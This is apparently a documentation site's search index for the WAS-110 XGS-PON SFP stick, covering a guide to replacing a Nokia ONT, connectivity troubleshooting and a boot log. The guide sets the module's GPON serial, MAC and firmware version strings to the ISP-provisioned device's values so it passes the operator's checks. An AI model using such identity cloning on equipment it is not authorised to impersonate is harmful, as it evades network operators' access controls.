WAS-110</p>"},{"location":"guides/swap-out-the-nokia-xs-010x-q-for-a-small-form-factor-pluggable-bfw-solutions-was-110/#from-the-shell","title":"from the shell","text":"Login over SSH <pre><code>ssh root@192.168.11.1\n</code></pre> Configure 8311 U-Boot environment <p>All attributes below are mandatory to achieve O5 operation state</p> <p>Replace the 8311_gpon_sn, 8311_iphost_mac, and 8311_sw_verA/B with the provisioned values.</p> <pre><code>fwenv_set 8311_iphost_mac FC:B2:D6:18:47:40 # (1)!\nfwenv_set 8311_gpon_sn ALCLFC1D37D3 # (2)!\nfwenv_set 8311_equipment_id BVMGY10BRAXS010XQ # (3)!\nfwenv_set 8311_hw_ver 3FE49331AAAB01 # (4)!\nfwenv_set 8311_cp_hw_ver_sync 1\nfwenv_set 8311_sw_verA 3FE49337AOCK10\nfwenv_set 8311_sw_verB 3FE49337AOCK80\nfwenv_set -b 8311_fw_match '^(3FE4933\\d[A-Z]OCK\\d{2})$'\nfwenv_set 8311_pon_slot 10\n</code></pre> <ol> <li>MAC ID</li> <li>Serial number or S/N</li> <li>CLEI + Mnemonic</li> <li>ONT P/N + ICS</li> </ol> <p>Additional details and variables are described at the original repository <sup>1</sup></p> <p><code>/usr/sbin/fwenv_set</code> is a helper script that executes <code>/usr/sbin/fw_setenv</code> twice consecutively.</p> <p>The WAS-110 functions as an A/B system, requiring the U-Boot environment variables to be set twice, once for each environment.</p> Verify and reboot <p>Prior to rebooting, verify that the 8311 environment variables are set correctly. If not, proceed to correct them with the <code>fwenv_set</code> command as before.</p> <pre><code>fw_printenv | grep ^8311\nreboot\n</code></pre> <p>Once rebooted, the SC/APC cable can safely be plugged into the WAS-110 and immediately receive O5 operational status.</p> <p>For troubleshooting, please read:</p> <p>Troubleshoot connectivity issues with the BFW Solutions WAS-110</p> <ol> <li> <p>https://github.com/djGrrr/8311-was-110-firmware-builder \u21a9</p> </li> </ol>"},{"location":"guides/troubleshoot-connectivity-issues-with-the-bfw-solutions-was-110/","title":"Troubleshoot connectivity issues with the BFW Solutions WAS-110","text":"<p>The MaxLinear SDK includes an extensive suite of debugging tools that come pre-bundled with the WAS-110 firmware(s). These tools can be run either from the shell console or have been tied into the web UI.</p>"},{"location":"guides/troubleshoot-connectivity-issues-with-the-bfw-solutions-was-110/#pon-troubleshooting","title":"PON troubleshooting","text":""},{"location":"guides/troubleshoot-connectivity-issues-with-the-bfw-solutions-was-110/#digital-diagnostic-monitor-interface","title":"Digital Diagnostic Monitor Interface","text":"<p>The WAS-110 supports the Digital Diagnostic Monitor Interface (DDMI)<sup>1</sup> to provide pseudo-real-time access to its operating parameters via a host interface. Although simplistic, this interface is suitable for monitoring power and temperature behaviours, which are the first tells of troubles.</p> <p>For more details on accessing this interface, please search your hosts' documentation for  Digital Diagnostic Monitoring (DDM) or Digital Optical Monitoring (DOM).</p>"},{"location":"guides/troubleshoot-connectivity-issues-with-the-bfw-solutions-was-110/#host-access","title":"Host access","text":""},{"location":"guides/troubleshoot-connectivity-issues-with-the-bfw-solutions-was-110/#linux-ddmi","title":"Linux","text":""},{"location":"guides/troubleshoot-connectivity-issues-with-the-bfw-solutions-was-110/#ubiquiti-ddmi","title":"Ubiquiti","text":"<pre><code>ethtool -m &lt;interface&gt;\n</code></pre>"},{"location":"guides/troubleshoot-connectivity-issues-with-the-bfw-solutions-was-110/#mikrotik-routeros-ddmi","title":"MikroTik RouterOS","text":"<pre><code>/interface ethernet monitor sfpX #(1)!\n</code></pre> <ol> <li>Replace sfp<code>X</code> with the port name/number.</li> </ol>"},{"location":"guides/troubleshoot-connectivity-issues-with-the-bfw-solutions-was-110/#optical-power","title":"Optical Power","text":""},{"location":"guides/troubleshoot-connectivity-issues-with-the-bfw-solutions-was-110/#optical-specifications","title":"Optical specifications","text":"Min. Max. Unit Tx Power 4 9 dBm Rx Power -29 -8 dBm"},{"location":"guides/troubleshoot-connectivity-issues-with-the-bfw-solutions-was-110/#optical-status","title":"Optical status","text":"<p>To determine if the WAS-110 optics are operating within specification, execute one of the following procedures:</p> 8311 firmwareAzores firmware <p>from the Web UI</p> <p></p> <ol> <li>Navigate to https://192.168.11.1/cgi-bin/luci/admin/8311/pon_status and, if asked, input your root password.</li> <li>From the PON Status page, select the Optical Status tab.</li> <li>Evaluate Transmit power and Receive power are within spec.</li> </ol> <p>from the Linux shell</p> <pre><code>pontop -b -g 'Optical Interface Status'\n</code></pre> <p>from the Web UI</p> <p></p> <ol> <li>Navigate to https://192.168.11.1/html/main.html#status/pon and, if asked, input your admin web credentials.</li> <li>From the Status tab, select the PON page.</li> <li>Evaluate Tx Power(dBm) and Rx Power(dBm) are within spec.</li> </ol> <p>from the Linux shell</p> <pre><code>i2c_cmd show optical\n</code></pre> <p>And as with a Linux host, the DDMI<sup>1</sup> is available locally, where both Laser output power and Receiver signal average optical power can be evaluated.</p> <pre><code>ethtool -m pon0\n</code></pre>"},{"location":"guides/troubleshoot-connectivity-issues-with-the-bfw-solutions-was-110/#fake-o5","title":"Fake O5","text":""},{"location":"guides/troubleshoot-connectivity-issues-with-the-bfw-solutions-was-110/#activation-states","title":"Activation states","text":"<ul> <li>O1 Initial state</li> <li>O2 Stand-by state</li> <li>O3 Serial number state</li> <li>O4 Ranging state</li> <li>O5 Operation state</li> <li>O6 POPUP state</li> <li>O7 Emergancy stop state</li> </ul> <p>A common term tossed around is fake O5, which is a misnomer that occurs when PLOAM message activation succeeds, including Serial Number and/or Registration ID authentication. However, the failure is further along in the registration chain, such as OMCI. It pertains to invalid managed entity attributes with common associations to device integrity, such as hardware and/or software versioning.</p>"},{"location":"guides/troubleshoot-connectivity-issues-with-the-bfw-solutions-was-110/#ploam-status","title":"PLOAM status","text":"<p>To view the current PLOAM status, execute one of the following procedures:</p> 8311 firmwareAzores firmware <p>from the Web UI</p> <p></p> <ol> <li>Navigate to https://192.168.11.1/cgi-bin/luci/admin/8311/pon_status and, if asked, input your root password.</li> <li>From the PON Status page, select the Status tab.</li> </ol> <p>from the Linux shell</p> <pre><code>pontop -b -g s\n</code></pre> <p>from the Web UI</p> <p></p> <ol> <li>Navigate to https://192.168.11.1/html/main.html#status/pon and, if asked, input your admin web credentials.</li> <li>From the Status tab, select the PON page.</li> </ol> <p>from the Linux shell</p> <pre><code>pontop -b -g s\n</code></pre>"},{"location":"guides/troubleshoot-connectivity-issues-with-the-bfw-solutions-was-110/#omci-clarification","title":"OMCI clarification","text":"<p>To help identify fake O5, execute the following command and if the response is empty, the operational state is  \"fake\" as the OLT did not respond with the dot1q<sup>6</sup> configuration.</p> <pre><code>omci_pipe.sh md | grep -E '^\\|\\s+(84|171)\\s\\|'\n</code></pre> <p>Additionally, it is possible to identify the connected OLT by executing the following command:</p> <pre><code>omci_pipe.sh meg 131 0\n</code></pre> <p>Typically, OLT operators enforce versioning compliance when software management is not handled over CWMP<sup>2</sup>.</p>"},{"location":"guides/troubleshoot-connectivity-issues-with-the-bfw-solutions-was-110/#lan-troubleshooting","title":"LAN troubleshooting","text":""},{"location":"guides/troubleshoot-connectivity-issues-with-the-bfw-solutions-was-110/#link-speed","title":"Link Speed","text":"<p>The WAS-110 will attempt to auto-negotiate with the host controller and, more often than not, fallback to 1 Gbps.  To prevent this behaviour, forcefully set the speed of the host interface to 10 Gbps.</p> <p>Furthermore, to force the link speed on the WAS-110 itself, execute the following <code>ethtool</code><sup>3</sup> procedures.</p> 8311 firmwareAzores firmware <p>from the Web UI permanent</p> <p></p> <ol> <li>Navigate to https://192.168.11.1/cgi-bin/luci/admin/8311/config and, if asked, input your root password.</li> <li>From the 8311 Configuration page, select the Device tab.</li> <li> <p>From the Device tab, set the Ethtool Speed Settings input to one of the following:</p> Parameters speed 1000 speed 2500 speed 10000 </li> </ol> <p>from the Linux shell temporary</p> <p>The following command sets the link speed temporarily until the next power cycle</p> <pre><code>ethtool -s eth0_0 speed &lt;speed&gt; #(1)!\n</code></pre> <ol> <li>Replace the &lt;speed&gt; parameter to either 1000, 2500, or 10000</li> </ol> <p>from the Web UI permanent</p> <p></p> <ol> <li>Navigate to https://192.168.11.1/html/main.html#service/setlanfixspeed, and, if asked, input your admin web credentials.</li> <li>From the Negotiation Speed page, select OnDemand and 10G link speed, and click Save.</li> </ol> <p>from the Linux shell temporary</p> <p>The following command sets the link speed temporarily until the next power cycle</p> <pre><code>ethtool -s eth0_0 speed &lt;speed&gt; #(1)!\n</code></pre> <ol> <li>Replace the &lt;speed&gt; parameter to either 1000, 2500, or 10000</li> </ol>"},{"location":"guides/troubleshoot-connectivity-issues-with-the-bfw-solutions-was-110/#tx-fault","title":"Tx fault","text":"<p>The SFP tx fault pin<sup>4</sup> (2) is multiplexed with UART tx. If the serial UART is enabled, tx fault may be asserted by the  host hardware and cause the link state to flap continuously.</p>"},{"location":"guides/troubleshoot-connectivity-issues-with-the-bfw-solutions-was-110/#serial-console","title":"Serial console","text":"<p>By default, serial UART is enabled during boot-up until Linux init, where it is disabled</p> 8311 firmwareAzores firmware <p>from the Web UI</p> <p></p> <ol> <li>Navigate to https://192.168.11.1/cgi-bin/luci/admin/8311/config and, if asked, input your root password.</li> <li>From the 8311 Configuration page, select the Device tab.</li> <li>From the Device tab, uncheck the Serial console checkbox.</li> </ol> <p>from the Linux shell</p> <p>To disable the serial console from the Linux shell, execute the following commands:</p> <pre><code>fwenv_set 8311_console_en\n</code></pre> <p>from the U-Boot shell</p> <p>To disable the serial console from the U-Boot shell, execute the following commands:</p> <pre><code>env delete 8311_console_en\nenv save\nenv save\n</code></pre> <p>Serial console is disabled by default, except in version 1.0.11</p> <p>To disable the serial console from the Linux shell, execute the following commands:</p> <pre><code>uci -c /ptconf set usrconfig_conf.InternetGatewayDevice__X_PT_CONSOLE_CFG__=interface\nuci -c /ptconf set usrconfig_conf.InternetGatewayDevice__X_PT_CONSOLE_CFG__.Enable=0\nuci -c /ptconf commit usrconfig_conf\n</code></pre>"},{"location":"guides/troubleshoot-connectivity-issues-with-the-bfw-solutions-was-110/#boot-console","title":"Boot console &amp; early printk","text":"<p>UART tx can be further controlled by two (2) U-Boot environment variables: <code>uart_select</code> and <code>uart_select_preboot</code>.</p> <p>DO NOT execute the following commands unless you understand the repercussions</p> from the Linux shell <pre><code>fwenv_set uart_select off\n</code></pre> from the U-Boot shell <pre><code>setenv uart_select off\nenv save\nenv save\n</code></pre> Pre-boot UART Recovery <p>To recover, a host device with serial breakout on SFP pins 2 (rx) and 7 (tx) will be required.</p> <ol> <li>Spam ESC in the serial terminal while plugging in the WAS-110  </li> <li>Press ENTER</li> <li>Type <code>mw.b 0xB6180121 0xd8</code> followed by ENTER</li> <li>Delete the <code>uart_select_preboot</code> environment variable     <pre><code>env set uart_select_preboot\nenv save\nenv save\n</code></pre></li> </ol>"},{"location":"guides/troubleshoot-connectivity-issues-with-the-bfw-solutions-was-110/#rx-loss","title":"Rx loss","text":"<p>The SFP rx loss pin<sup>5</sup> (8) is asserted when the SC/APC fiber cable isn't plugged in and/or inactive. Depending on the host controller and implementation, the interface may enter a power saving state, making the WAS-110 inaccessible.</p> 8311 firmwareAzores firmware <p>Rx loss is deasserted by default as of version 2.3.0</p> <p>from the Web UI</p> <p></p> <ol> <li>Navigate to https://192.168.11.1/cgi-bin/luci/admin/8311/config and, if asked, input your root password.</li> <li>From the 8311 Configuration page, select the Device tab.</li> <li>From the Device tab, uncheck the RX Loss of Signal checkbox.</li> </ol> <p>from the Linux shell</p> <p>To disable rx loss from the Linux shell, execute the following commands:</p> <pre><code>fwenv_set 8311_rx_los\n</code></pre> <p>from the U-Boot shell</p> <p>To disable rx loss from the U-Boot shell, execute the following commands:</p> <pre><code>env delete 8311_rx_los\nenv save\nenv save\n</code></pre> <p>Unfortunately, rx loss can't be disabled.</p>"},{"location":"guides/troubleshoot-connectivity-issues-with-the-bfw-solutions-was-110/#host-solutions","title":"Host solutions","text":""},{"location":"guides/troubleshoot-connectivity-issues-with-the-bfw-solutions-was-110/#mikrotik-routeros-rxlos","title":"MikroTik RouterOS","text":"<p>Requires RouterOS 7.15+</p> <pre><code>/interface ethernet set sfpX sfp-ignore-rx-los=yes #(1)!\n</code></pre> <ol> <li>Replace spf<code>X</code> with the port name/number.</li> </ol> <ol> <li> <p>SFF-8472 \u21a9\u21a9</p> </li> <li> <p>https://en.wikipedia.org/wiki/TR-069 \u21a9</p> </li> <li> <p>https://www.linux.org/docs/man8/ethtool.html \u21a9</p> </li> <li> <p>https://en.wikipedia.org/wiki/Small_Form-factor_Pluggable#Signals \u21a9</p> </li> <li> <p>SFF-8419 \u21a9</p> </li> <li> <p>https://en.wikipedia.org/wiki/IEEE_802.1Q \u21a9</p> </li> </ol>"},{"location":"xgs-pon/","title":"10-Gigabit Symmetrical Passive Optical Network","text":""},{"location":"xgs-pon/ont/bfw-solutions/was-110/","title":"WAS-110","text":""},{"location":"xgs-pon/ont/bfw-solutions/was-110/#architecture","title":"Architecture","text":""},{"location":"xgs-pon/ont/bfw-solutions/was-110/#maxlinear-prx126","title":"MaxLinear PRX126 <sup>2</sup>","text":"<pre><code>%%{ init: { 'flowchart': { 'htmlLabels': false, 'curve': 'stepBefore' } } }%%\nflowchart LR\n    Z[\" \"] &lt;--Fiber --&gt;\n    A(BOSA)\n    B(\"DRIVER/\n    LA\n    (PMD)\")\n    A --&gt; B\n    B --&gt; A\n    subgraph SOC\n        C(\"SERDES\n        /CDR\")\n        subgraph MAC\n            D(\"10G(E)PON\n            PCS&amp;MAC/\n            TC\") ~~~\n            E(\"10G-\n            Ethernet\n            PCS&amp;MAC\")\n        end\n        C &lt;--&gt; MAC\n        F(\"Network\n        Processsor\n        /Package\n        Switch\")\n        MAC &lt;--&gt; F\n        G(\"10G-\n        Ethernet\n        PCS&amp;\n        MAC\")\n        F &lt;--&gt; G &lt;--&gt;\n        H(\"SERDES\n        /CDR\")\n        I(\"XO/PLL\") ~~~\n        J(\"Multi-Core Processor/Subsystem Controller\")\n    end\n    B &lt;--&gt; C\n    Y[\" \"]\n    Y -- SFI/XFI --&gt; H\n    H --&gt; Y\n    J &lt;-- I2C --&gt; X[\" \"]\n    SOC ~~~\n    K(\"Crystal 40Mhz\") ~~~\n    L(\"SLC NAND Flash\") ~~~\n    M(\"LPDDR3\")\n    style SOC fill:transparent,stroke:limegreen,stroke-width:2px,color:#fff,stroke-dasharray: 10 5\n    style MAC fill:PapayaWhip,stroke:SandyBrown,color:transparent,stroke-width:2px\n    classDef SEA fill:LightSkyBlue,font-weight:bold,stroke:DodgerBlue,stroke-width:2px\n    classDef CORAL fill:PapayaWhip,font-weight:bold,stroke:SandyBrown,stroke-width:2px\n    classDef CLEAR fill:transparent,stroke:transparent,color:transparent\n    class A,C,F,G,I,J,K,H,L,M SEA\n    class B,D,E,G CORAL\n    class Z,Y,X CLEAR</code></pre>"},{"location":"xgs-pon/ont/bfw-solutions/was-110/#system-information","title":"System Information","text":""},{"location":"xgs-pon/ont/bfw-solutions/was-110/#boot-log","title":"Boot log","text":"<pre><code>ROM VER: 2.1.0\nCFG 0d\nB\nDdrOk \n\n\nU-Boot 2016.07-MXL-v-3.1.261 (Apr 19 2023 - 07:07:22 +0000), Build: prx126-sfp-qspi-nand\n\ninterAptiv\ncps cpu/ddr run in 400/466 Mhz\n       Watchdog enabled\nDRAM:  256 MiB\nNAND:  device found, Manufacturer ID: 0xef, Chip ID: 0xba\n128 MiB\nBad block table found at page 65472, version 0x01\nBad block table found at page 65408, version 0x01\nIn:    serial\nOut:   serial\nErr:   serial\nReset cause: POR RESET\nNet:   lan-0 config to 1G_XAUI_MODE, lan-1 config to 10G_KR_MODE, prx300-eth\n\nrun flash_flash to bring up the kernel\n\nHit Esc key to stop autoboot:  3 \nbegin net init\nupgrade start! \npt_upg_auto_upgrade start!\nTimeout or packet isn't legal. Do not enter multicast upgrade\nauto upgrade failed.\nupgrade start! \npt_upg_auto_upgrade start!\nTimeout or packet isn't legal. Do not enter multicast upgrade\nauto upgrade failed.\n 2 \nbegin net init\nupgrade start! \npt_upg_auto_upgrade start!\nTimeout or packet isn't legal. Do not enter multicast upgrade\nauto upgrade failed.\nupgrade start! \npt_upg_auto_upgrade start!\nTimeout or packet isn't legal. Do not enter multicast upgrade\nauto upgrade failed.\n 1 \nbegin net init\nupgrade start! \npt_upg_auto_upgrade start!\nTimeout or packet isn't legal. Do not enter multicast upgrade\nauto upgrade failed.\nupgrade start! \npt_upg_auto_upgrade start!\nTimeout or packet isn't legal. Do not enter multicast upgrade\nauto upgrade failed.\n 0 \nubi0: attaching mtd1\nubi0: scanning is finished\nubi0: attached mtd1 (name \"mtd=6\", size 102 MiB)\nubi0: PEB size: 131072 bytes (128 KiB), LEB size: 126976 bytes\nubi0: min./max. I/O unit sizes: 2048/2048, sub-page size 2048\nubi0: VID header offset: 2048 (aligned 2048), data offset: 4096\nubi0: good PEBs: 816, bad PEBs: 0, corrupted PEBs: 0\nubi0: user volume: 8, internal volumes: 1, max. volumes count: 128\nubi0: max/mean erase counter: 2/1, WL threshold: 4096, image sequence number: 0\nubi0: available PEBs: 175, total reserved PEBs: 641, PEBs reserved for bad PEB handling: 20\nRemove UBI volume rootfs_data (id 6)\nCommitted image: A\nubi0: detaching mtd1\nubi0: mtd1 is detached\nubi0: attaching mtd1\nubi0: scanning is finished\nubi0: attached mtd1 (name \"mtd=6\", size 102 MiB)\nubi0: PEB size: 131072 bytes (128 KiB), LEB size: 126976 bytes\nubi0: min./max. I/O unit sizes: 2048/2048, sub-page size 2048\nubi0: VID header offset: 2048 (aligned 2048), data offset: 4096\nubi0: good PEBs: 816, bad PEBs: 0, corrupted PEBs: 0\nubi0: user volume: 7, internal volumes: 1, max. volumes count: 128\nubi0: max/mean erase counter: 2/1, WL threshold: 4096, image sequence number: 0\nubi0: available PEBs: 440, total reserved PEBs: 376, PEBs reserved for bad PEB handling: 20\nRead 0 bytes from volume bootcoreA to a0400000\nNo size specified -&gt; Using max size (5586944)\nRead 0 bytes from volume kernelA to 82000000\nNo size specified -&gt; Using max size (2412544)\n## Booting kernel from Legacy Image at 82000000 ...\n   Image Name:   PON_1.18.0\n   Created:      2023-04-19   7:11:20 UTC\n   Image Type:   MIPS Linux Kernel Image (lzma compressed)\n   Data Size:    2285568 Bytes = 2.2 MiB\n   Load Address: a0020000\n   Entry Point:  a0020000\n   Verifying Checksum ... OK\n   Uncompressing Kernel Image ... OK\n[    0.000000] Linux version 4.9.308+ (gcc version 8.3.0 (OpenWrt GCC 8.3.0 v19.07.8_maxlinear) ) #0 SMP Wed Apr 19 06:54:47 UTC 2023\n[    0.000000] SoC: PRX300 rev 1.2\n[    0.000000] CPU0 revision is: 0001a120 (MIPS interAptiv (multi))\n[    0.000000] Enhanced Virtual Addressing (EVA 1GB) activated\n[    0.000000] MIPS: machine is PRX126-SFP-PON\n[    0.000000] Coherence Manager IOCU detected\n[    0.000000] Hardware DMA cache coherency disabled\n[    0.000000] earlycon: lantiq0 at MMIO 0x16380000 (options '')\n[    0.000000] bootconsole [lantiq0] enabled\n[    0.000000] User-defined physical RAM map:\n[    0.000000]  memory: 40000000 @ 20000000 (usable)\n[    0.000000] Reserved memory: created CMA memory pool at 0x2d000000, size 48 MiB\n[    0.000000] OF: reserved mem: initialized node linux,cma@0x2D000000, compatible id shared-dma-pool\n[    0.000000] Reserved memory: created CMA memory pool at 0x40000000, size 512 MiB\n[    0.000000] OF: reserved mem: initialized node bm_pool@40000000, compatible id shared-dma-pool\n[    0.000000] Determined physical RAM map:\n[    0.000000]  memory: 40000000 @ 20000000 (usable)\n[    0.000000]  memory: 0000809e @ 20768630 (reserved)\n[    0.000000]  memory: 22000000 @ 3e000000 (reserved)\n[    0.000000]  memory: 03000000 @ 2d000000 (reserved)\n[    0.000000]  memory: 00200000 @ 3be00000 (reserved)\n[    0.000000] Initrd not found or empty - disabling initrd\n[    0.000000] SMPCMP: CPU0: cmp_smp_setup\n[    0.000000] VPE topology {2,2} total 4\n[    0.000000] Detected 3 available secondary CPU(s)\n[    0.000000] Primary instruction cache 32kB, VIPT, 4-way, linesize 32 bytes.\n[    0.000000] Primary data cache 32kB, 4-way, PIPT, no aliases, linesize 32 bytes\n[    0.000000] MIPS secondary cache 256kB, 8-way, linesize 32 bytes.\n[    0.000000] Zone ranges:\n[    0.000000]   DMA      [mem 0x0000000020000000-0x000000002fffffff]\n[    0.000000]   Normal   [mem 0x0000000030000000-0x000000005fffffff]\n[    0.000000] Movable zone start for each node\n[    0.000000] Early memory node ranges\n[    0.000000]   node   0: [mem 0x0000000020000000-0x000000005fffffff]\n[    0.000000] Initmem setup node 0 [mem 0x0000000020000000-0x000000005fffffff]\n[    0.000000] percpu: Embedded 12 pages/cpu s17968 r8192 d22992 u49152\n[    0.000000] Built 1 zonelists in Zone order, mobility grouping on.  Total pages: 260096\n[    0.000000] Kernel command line: ubi.mtd=system_sw,2048 rootfsname=rootfsA rootfstype=squashfs ip=192.168.1.1:192.168.1.2:192.162.1.1:255.2 \n[    0.000000] PID hash table entries: 4096 (order: 2, 16384 bytes)\n[    0.000000] Dentry cache hash table entries: 131072 (order: 7, 524288 bytes)\n[    0.000000] Inode-cache hash table entries: 65536 (order: 6, 262144 bytes)\n[    0.000000] Writing ErrCtl register=00000000\n[    0.000000] Readback ErrCtl register=00000000\n[    0.000000] Memory: 421880K/1048576K available (5529K kernel code, 289K rwdata, 1392K rodata, 1284K init, 468K bss, 53256K reserved, 573440)\n[    0.000000] SLUB: HWalign=32, Order=0-3, MinObjects=0, CPUs=4, Nodes=1\n[    0.000000] Hierarchical RCU implementation.\n[    0.000000] NR_IRQS:527\n[    0.000000] EIC is off\n[    0.000000] VINT is on\n[    0.000000] CPU Clock: 400000000Hz  mips_hpt_frequency 200000000Hz\n[    0.000000] clocksource: GIC: mask: 0xffffffffffffffff max_cycles: 0x5c4093a7d1, max_idle_ns: 440795210635 ns\n[    0.000017] sched_clock: 64 bits at 400MHz, resolution 2ns, wraps every 4398046511103ns\n[    0.008523] Calibrating delay loop... 265.98 BogoMIPS (lpj=531968)\n[    0.045333] pid_max: default: 32768 minimum: 301\n[    0.050380] Mount-cache hash table entries: 2048 (order: 1, 8192 bytes)\n[    0.056568] Mountpoint-cache hash table entries: 2048 (order: 1, 8192 bytes)\n[    0.065364] CCA is coherent, multi-core is fine\n[    0.079899] Per DT Bootup LINUX not run on CPU 1\n[    0.083172] Please retry with MAX_CPUS !!!\n[    0.087141] cpu 1 is not available for Linux\n[    1.114295] CPU1: failed to start\n[    1.117026] Per DT Bootup LINUX not run on CPU 2\n[    1.120784] Please retry with MAX_CPUS !!!\n[    1.124838] cpu 2 is not available for Linux\n[    2.143926] CPU2: failed to start\n[    2.146647] Per DT Bootup LINUX not run on CPU 3\n[    2.150418] Please retry with MAX_CPUS !!!\n[    2.154465] cpu 3 is not available for Linux\n[    3.173557] CPU3: failed to start\n[    3.175435] Brought up 1 CPUs\n[    3.198011] clocksource: jiffies: mask: 0xffffffff max_cycles: 0xffffffff, max_idle_ns: 7645041785100000 ns\n[    3.206435] futex hash table entries: 1024 (order: 3, 32768 bytes)\n[    3.267677] pinctrl core: initialized pinctrl subsystem\n[    3.273965] NET: Registered protocol family 16\n[    3.283227] intel-pinctrl 16310000.pinctrl: pinbank id: 0, reg: 0xb6310000, pinbase: 0, pin number: 32, pinmap: 0xffffffff\n[    3.293420] intel-pinctrl 16310000.pinctrl: Total 27 groups, 17 functions\n[    3.299926] intel-pinctrl 16310000.pinctrl: gpiochip membase: 0xb6300000\n[    3.325317] Lantiq MIPSInterAptiv MPS driver, version 1.0.0.0, (c) 2006-2013 Lantiq Deutschland GmbH\n[    3.333931] MPS: major Id 253\n[    3.339302] dma0-grx500 16e00000.dma: base address b6e00000 chained_irq 34 irq_base 57\n[    3.345894] dma0-grx500 16e00000.dma: Init done - hw rev: A, ports: 4, channels: 16\n[    3.354075] dma-grx500 18200000.dma: dma1tx base address b8200000 chained_irq 38 irq_base 73\n[    3.377645] dma-grx500 18200000.dma: Init done - rev: 30, ports: 1, channels: 17\n[    3.384234] dma-grx500 18300000.dma: dma1rx base address b8300000 chained_irq 39 irq_base 90\n[    3.396981] dma-grx500 18300000.dma: Init done - rev: 30, ports: 1, channels: 8\n[    3.403195] dma-grx500 18500000.dma: dma2tx base address b8500000 chained_irq 40 irq_base 98\n[    3.415618] dma-grx500 18500000.dma: Init done - rev: 30, ports: 1, channels: 2\n[    3.421778] dma-grx500 18600000.dma: dma2rx base address b8600000 chained_irq 41 irq_base 100\n[    3.434637] dma-grx500 18600000.dma: Init done - rev: 30, ports: 1, channels: 8\n[    3.444133] [PP_DEV]:init_clocks:184: enabling pp clock 'ppv4'\n[    3.448630] [PP_DEV]:init_clocks:184: enabling pp clock 'freq'\n[    3.457406] [PP_QOS_UTILS]:qos_init_wred_ports:4603: Init QoS 128 ports\n[    3.462607] [PP_QOS_UTILS]:qos_init_wred_queues:4614: Init QoS 256 queues\n[    3.501480] pstore: using zlib compression\n[    3.506138] console [pstore-1] enabled\n[    3.508753] pstore: Registered ramoops as persistent store backend\n[    3.514627] ramoops: attached 0x200000@0x3be00000, ecc: 0/0\n[    3.548363] prx300-cqm prx300-cqm.1: assigned reserved memory node bm_pool@40000000\n[    3.642026] 0x80000000 0x1120000 0x400\n[    3.644417] 0x80000000 0x1120000\n[    3.725890] 0x81120000 0xfa0000 0x2800\n[    3.728199] 0x81120000 0xfa0000\n[    4.961580] 0x820c0000 0xf7f0000 0x400\n[    4.963982] 0x820c0000 0xf7f0000\n[    6.101993] 0x918b0000 0xe4c0000 0x2800\n[    6.104396] 0x918b0000 0xe4c0000\n[    6.128233] prx300-cqm prx300-cqm.1: fsqm init successfully, free buffers 7167\n[    6.134426] Load spreader init successfully\n[    6.138592] prx300-cqm prx300-cqm.1: CBM: Init Done !!\n[    6.143696] pps_core: LinuxPPS API ver. 1 registered\n[    6.148288] pps_core: Software ver. 5.3.6 - Copyright 2005-2007 Rodolfo Giometti &lt;giometti@linux.it&gt;\n[    6.157430] PTP clock support registered\n[    6.165355] clocksource: Switched to clocksource GIC\n[    6.172066] NET: Registered protocol family 2\n[    6.175394] IP idents hash table entries: 16384 (order: 5, 131072 bytes)\n[    6.184552] TCP established hash table entries: 8192 (order: 3, 32768 bytes)\n[    6.190555] TCP bind hash table entries: 8192 (order: 4, 65536 bytes)\n[    6.196929] TCP: Hash tables configured (established 8192 bind 8192)\n[    6.203183] UDP hash table entries: 512 (order: 2, 16384 bytes)\n[    6.208952] UDP-Lite hash table entries: 512 (order: 2, 16384 bytes)\n[    6.215613] NET: Registered protocol family 1\n[    6.227072] No memory allocated for crashlog\n[    6.232651] workingset: timestamp_bits=30 max_order=18 bucket_order=0\n[    6.250022] squashfs: version 4.0 (2009/01/31) Phillip Lougher\n[    6.254483] jffs2: version 2.2 (NAND) (SUMMARY) (LZMA) (RTIME) (CMODE_PRIORITY) (c) 2001-2006 Red Hat, Inc.\n[    6.289596] io scheduler noop registered\n[    6.292084] io scheduler deadline registered (default)\n[    6.298887] platform 1a800000.cb0phy: PHY(0:1) clock frequency set to 156250000 Success!\n[    6.309116] 16380000.serial: ttyLTQ0 at MMIO 0x16380000 (irq = 25, base_baud = 0) is a lantiq,asc\n[    6.326154] console [ttyLTQ0] enabled\n[    6.326154] console [ttyLTQ0] enabled\n[    6.332032] bootconsole [lantiq0] disabled\n[    6.332032] bootconsole [lantiq0] disabled\n[    6.340793] 163c0000.serial: ttyLTQ1 at MMIO 0x163c0000 (irq = 28, base_baud = 0) is a lantiq,asc\n[    6.353955] brd: module loaded\n[    6.356600] Gluebi: Found kernel commandline option 'rootfsname=rootfsA'\n[    6.365997] Lantiq SoC SPI controller rev 9 (TXFS 32, RXFS 32, DMA 1)\n[    6.372013] cadence-qspi 19300000.qspi: missing lantiq,qspi-physize; default to 128 MB\n[    6.378978] cadence-qspi 19300000.qspi: DMA NOT enabled\n[    6.386083] cadence-qspi 19300000.qspi: master is unqueued, this is deprecated\n[    6.395063] nand: device found, Manufacturer ID: 0xef, Chip ID: 0xba\n[    6.400047] nand: Winbond SPI NAND 1Gbit 1,8v WN25N01GW\n[    6.405217] nand: 128 MiB, SLC, erase size: 128 KiB, page size: 2048, OOB size: 64\n[    6.414026] Bad block table found at page 65472, version 0x01\n[    6.419503] Bad block table found at page 65408, version 0x01\n[    6.425448] 9 cmdlinepart partitions found on MTD device nand.0\n[    6.430128] Creating 9 MTD partitions on \"nand.0\":\n[    6.434900] 0x000000000000-0x000000100000 : \"uboot\"\n[    6.442014] 0x000000100000-0x000000140000 : \"ubootconfigA\"\n[    6.448731] 0x000000140000-0x000000180000 : \"ubootconfigB\"\n[    6.455512] 0x000000180000-0x0000001c0000 : \"gphyfirmware\"\n[    6.462817] 0x0000001c0000-0x0000002c0000 : \"calibration\"\n[    6.469697] 0x0000002c0000-0x0000012c0000 : \"bootcore\"\n[    6.476154] 0x0000012c0000-0x0000078c0000 : \"system_sw\"\n[    6.483995] 0x0000078c0000-0x000007ec0000 : \"ptdata\"\n[    6.490705] 0x000007ec0000-0x000008000000 : \"res\"\n[    6.496748] cadence-qspi 19300000.qspi: Cadence QSPI controller driver\n[    6.502196] MACsec IEEE 802.1AE\n[    6.506680] intel_xpcs 1a842000.lan_xpcs1: XPCS probe start\n[    6.552438] intel_xpcs 1a842000.lan_xpcs1: XPCS probe success\n[    6.575438] dp manager dummy init done\n[    6.579014] ltq_thermal 16000000.ssx4:ts: ltq_thermal_probe: is done\n[    6.584686] grx500wdt 12000000.watchdog: [grx500wdt_probe]:[445] cpu_clk=400000000\n[    6.591714] grx500wdt 12000000.watchdog: [grx500wdt_probe]WDT reset is Bit31, RCU_IAP_WDT_RST_STAT=0x8030408\n[    6.601481] 